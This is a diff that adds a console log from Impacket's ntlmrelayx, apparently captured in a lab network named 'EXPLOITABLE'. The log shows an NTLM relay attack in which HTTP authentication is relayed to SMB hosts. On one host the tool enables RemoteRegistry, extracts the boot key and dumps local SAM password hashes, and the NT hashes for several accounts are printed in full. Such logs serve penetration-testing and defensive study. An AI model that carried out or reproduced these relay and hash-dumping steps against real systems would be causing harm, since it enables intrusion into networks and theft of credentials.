@@ -1,0 +1,77 @@
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client WINRMS loaded..
+[*] Running in relay mode to hosts in targetfile
+[*] Setting up SMB Server on port 449
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Setting up WinRM (HTTP) Server on port 5985
+[*] Setting up WinRMS (HTTPS) Server on port 5986
+[*] Setting up RPC Server on port 135
+[*] Multirelay enabled
+
+[*] Servers started, waiting for connections
+[*] (HTTP): Client requested path: /inetpub
+[*] (HTTP): Client requested path: /inetpub
+[*] (HTTP): Client requested path: /inetpub
+[]
+[*] (HTTP): Connection from EXPLOITABLE/RHACKU@192.168.31.151 controlled, attacking target smb://192.168.31.150
+[*] (HTTP): Client requested path: /jojkt96yd1
+[*] (HTTP): Client requested path: /jojkt96yd1
+[-] Signing is required, attack won't work unless using -remove-target / --remove-mic
+[*] (HTTP): Client requested path: /jojkt96yd1
+[*] (HTTP): Authenticating connection from EXPLOITABLE/RHACKU@192.168.31.151 against smb://192.168.31.150 SUCCEED [1]
+[]
+[*] (HTTP): Connection from EXPLOITABLE/RHACKU@192.168.31.151 controlled, attacking target smb://192.168.31.151
+[*] (HTTP): Client requested path: /s77459mtoa
+[*] (HTTP): Client requested path: /s77459mtoa
+[-] smb://EXPLOITABLE/RHACKU@192.168.31.150 [1] -> SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+[*] (HTTP): Client requested path: /s77459mtoa
+[-] (HTTP): Authenticating against smb://192.168.31.151 as EXPLOITABLE/RHACKU FAILED
+[ParseResult(scheme='smb', netloc='EXPLOITABLE\\RHACKU@192.168.31.151', path='', params='', query='', fragment='')]
+[*] (HTTP): Client requested path: /inetpub
+[*] (HTTP): Client requested path: /inetpub
+[*] (HTTP): Client requested path: /inetpub
+[ParseResult(scheme='smb', netloc='EXPLOITABLE\\RHACKU@192.168.31.151', path='', params='', query='', fragment='')]
+[*] (HTTP): Connection from EXPLOITABLE/RHACKU@192.168.31.151 controlled, attacking target smb://192.168.31.152
+[*] (HTTP): Client requested path: /u86jo1a9t5
+[*] (HTTP): Client requested path: /u86jo1a9t5
+[*] (HTTP): Client requested path: /u86jo1a9t5
+[*] (HTTP): Authenticating connection from EXPLOITABLE/RHACKU@192.168.31.151 against smb://192.168.31.152 SUCCEED [2]
+[*] All targets processed!
+[*] (HTTP): Connection from EXPLOITABLE/RHACKU@192.168.31.151 controlled, but there are no more targets left!
+[*] (HTTP): Client requested path: /inetpub
+[*] (HTTP): Client requested path: /inetpub
+[*] (HTTP): Client requested path: /inetpub
+[*] All targets processed!
+[*] (HTTP): Connection from EXPLOITABLE/RHACKU@192.168.31.151 controlled, but there are no more targets left!
+[*] (HTTP): Client requested path: /inetpub
+[*] (HTTP): Client requested path: /inetpub
+[*] smb://EXPLOITABLE/RHACKU@192.168.31.152 [2] -> Service RemoteRegistry is in stopped state
+[*] (HTTP): Client requested path: /inetpub
+[*] All targets processed!
+[*] (HTTP): Connection from EXPLOITABLE/RHACKU@192.168.31.151 controlled, but there are no more targets left!
+[*] smb://EXPLOITABLE/RHACKU@192.168.31.152 [2] -> Service RemoteRegistry is disabled, enabling it
+[*] smb://EXPLOITABLE/RHACKU@192.168.31.152 [2] -> Starting service RemoteRegistry
+[*] smb://EXPLOITABLE/RHACKU@192.168.31.152 [2] -> Target system bootKey: 0x15a7b3bcdc63e0aaa1b4703d692036a4
+[*] smb://EXPLOITABLE/RHACKU@192.168.31.152 [2] -> Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:0172edd49ae916a2a2dd853768b6487d:::
+suika:1001:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
+[*] smb://EXPLOITABLE/RHACKU@192.168.31.152 [2] -> Done dumping SAM hashes for host: 192.168.31.152
+[*] smb://EXPLOITABLE/RHACKU@192.168.31.152 [2] -> Stopping service RemoteRegistry
+[*] smb://EXPLOITABLE/RHACKU@192.168.31.152 [2] -> Restoring the disabled state for service RemoteRegistry
